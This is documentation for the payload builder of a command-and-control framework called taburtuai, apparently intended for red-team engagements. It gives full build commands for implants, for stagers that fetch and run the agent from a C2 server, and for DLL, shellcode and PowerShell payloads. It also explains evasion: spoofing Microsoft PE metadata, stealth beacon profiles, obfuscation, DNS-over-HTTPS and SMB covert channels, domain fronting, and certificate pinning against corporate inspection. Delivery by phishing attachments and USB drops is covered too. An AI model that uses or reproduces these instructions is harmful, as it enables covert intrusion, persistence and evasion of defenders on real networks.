# Building Payloads

How to use the `taburtuai-generate` builder to produce agents and stagers for different scenarios.

---

## Why a Separate Builder?

The builder (`cmd/generate`) compiles agents with configuration baked in via `-ldflags` at build time. This means:
- No config files on disk at runtime — all settings are embedded in the binary
- Each build can have a different encryption key, interval, profile, and masquerade identity
- Unique per-build random salt ensures different UUIDs even with identical config

---

## Build the Generator

```bash
go build -o bin/taburtuai-generate ./cmd/generate
```

---

## Subcommands

### `stageless` — Self-Contained Agent

A complete agent binary. No external download phase. Larger but more reliable.

```bash
./bin/taburtuai-generate stageless \
  --c2 http://192.168.1.10:8080 \
  --key changeme \
  --arch amd64 \
  --output ./output/agent.exe
```

**When to use:** When you control the delivery mechanism and can transfer a ~10MB file. More reliable than staged delivery because it does not depend on the stage server being up at execution time.

### `stager` — Minimal Downloader

A tiny binary that downloads and executes the full agent from the C2 stage endpoint. Smaller footprint for initial delivery.

```bash
# 1. Upload the full agent to the server's stage storage
./bin/taburtuai-generate upload \
  --server http://192.168.1.10:8080 \
  --file ./output/agent.exe \
  --name agent_v2

# 2. Build a stager that downloads from the server
./bin/taburtuai-generate stager \
  --server http://192.168.1.10:8080 \
  --key changeme \
  --arch amd64 \
  --output ./output/stager.exe
```

**When to use:** When your delivery mechanism has size limits (e.g. phishing attachments, USB drops, script-based delivery). The stager is typically ~300KB versus ~10MB for stageless.

**Risk:** If the stage server is blocked at execution time, the stager fails. Use `stageless` when reliability is more important than size.

---

## Format Options

| Format | Flag | Description | Use Case |
|--------|------|-------------|----------|
| EXE | `--format exe` | Windows PE executable | Most common for Windows |
| DLL | `--format dll` | Windows DLL with export | DLL sideloading, RunDLL32 |
| ELF | `--format elf` | Linux/macOS executable | Linux targets |
| Shellcode | `--format shellcode` | Raw x64 shellcode | Inject into another loader |
| PowerShell | `--format ps1` | Self-contained PS1 script | Script-based delivery |

---

## OPSEC Profiles

Profiles control runtime behavior baked at compile time.

```bash
./bin/taburtuai-generate stageless \
  --c2 https://c2.example.com \
  --key changeme \
  --profile stealth \
  --arch amd64 \
  --output ./output/agent_stealth.exe
```

| Profile | Beacon | Jitter | Work Hours | Sleep Mask |
|---------|--------|--------|-----------|-----------|
| `default` | 30s | 30% | no | no |
| `aggressive` | 5s | 10% | no | no |
| `opsec` | 60s | 30% | no | yes |
| `stealth` | 300s | 50% | 08:00–18:00 | yes |
| `paranoid` | 600s | 50% | 09:00–17:00 | yes |

---

## PE Masquerading

Every Windows build can have its PE version resource spoofed to look like a legitimate Windows binary.

```bash
./bin/taburtuai-generate stageless \
  --c2 https://c2.example.com \
  --key changeme \
  --arch amd64 \
  --masq-company "Microsoft Corporation" \
  --masq-product "Microsoft Windows Operating System" \
  --masq-desc "Windows Security Health Service" \
  --masq-internal "SecurityHealthService" \
  --masq-orig "SecurityHealthService.exe" \
  --masq-ver-major 10 \
  --masq-ver-minor 0 \
  --masq-ver-build 19041 \
  --output ./output/SecurityHealthService.exe
```

**What this changes:**
- `VERSIONINFO` resource block visible in `Properties → Details` tab in Windows Explorer
- Company, Product, Description, Internal name, Original filename, Version number
- Does NOT change the binary's actual code signature or authenticode hash

**Why it matters:** Analysts and EDR products often look at PE metadata during triage. A binary claiming to be `SecurityHealthService.exe` by Microsoft is less immediately suspicious than an unsigned unnamed binary.

---

## Binary Hardening

| Flag | Effect | When to Use |
|------|--------|-------------|
| `--compress` | UPX compression | When size matters; some AV flags UPX |
| `--no-gui` | Hide console window (`-H windowsgui`) | Production Windows builds |
| `--obfuscate` | Garble-based code obfuscation | Highest evasion (requires Garble installed) |

**Recommended production flags:**
```bash
./bin/taburtuai-generate stageless \
  --c2 https://c2.example.com \
  --key changeme \
  --profile opsec \
  --arch amd64 \
  --no-gui \
  --output ./output/agent.exe
```

---

## Alternative Transports

Build the agent to communicate over a covert channel instead of plain HTTP.

```bash
# DNS-over-HTTPS (blends into normal HTTPS traffic to Cloudflare/Google)
./bin/taburtuai-generate stageless \
  --c2 https://c2.example.com \
  --key changeme \
  --transport doh \
  --doh-domain tunnels.c2.example.com \
  --doh-provider cloudflare \
  --output ./output/agent_doh.exe

# SMB named pipe (works laterally, no external network needed)
./bin/taburtuai-generate stageless \
  --c2 https://c2.example.com \
  --key changeme \
  --transport smb \
  --smb-pipe \\.\pipe\svchost \
  --output ./output/agent_smb.exe
```

**When to use DoH:** Target network egress is locked down to HTTPS only, or HTTP traffic to unknown IPs is monitored. DoH traffic looks like DNS resolver queries to Cloudflare.

**When to use SMB:** Pivoting laterally inside a network where the target has no direct internet access but has network connectivity to a pivot host.

---

## Domain Fronting

Route beacon traffic through a CDN (Cloudflare, Azure, AWS CloudFront) while the Host header points to your actual C2 server.

```bash
./bin/taburtuai-generate stageless \
  --c2 https://real-c2.example.com \
  --key changeme \
  --front-domain legitimate-cdn.azurefd.net \
  --arch amd64 \
  --output ./output/agent.exe
```

**How it works:** The agent connects TLS to `legitimate-cdn.azurefd.net` but sends `Host: real-c2.example.com` in the request. The CDN forwards the request to your origin. Network monitoring sees traffic to a trusted CDN, not your server.

---

## TLS Certificate Pinning

Prevent MitM interception by pinning the server's TLS certificate SHA-256 fingerprint into the agent.

```bash
# Get your server certificate fingerprint
openssl s_client -connect c2.example.com:443 </dev/null 2>/dev/null \
  | openssl x509 -outform DER \
  | openssl dgst -sha256 -hex

# Build with cert pin
./bin/taburtuai-generate stageless \
  --c2 https://c2.example.com \
  --key changeme \
  --cert-pin "a1b2c3d4e5f6..." \
  --output ./output/agent_pinned.exe
```

**Why use it:** Without pinning, a network proxy or corporate firewall doing TLS inspection can intercept all agent traffic. With the pin, the agent refuses connections from any certificate that doesn't match — including intercepting proxies.

---

## Build Output Summary

After a successful build the generator prints:

```
[*] String obfuscation key: 4a7f2c9d1e8b3f5a0c6d2e9f1a4b7c8d
[*] Building C implant (Windows/amd64)...
[+] Agent compiled: ./output/agent.exe
    Size      : 8423 KB
    SHA256    : a1b2c3d4e5f6...
    Build time: 14.2s
```

Save the SHA256 for tracking which binary was deployed where during the engagement.
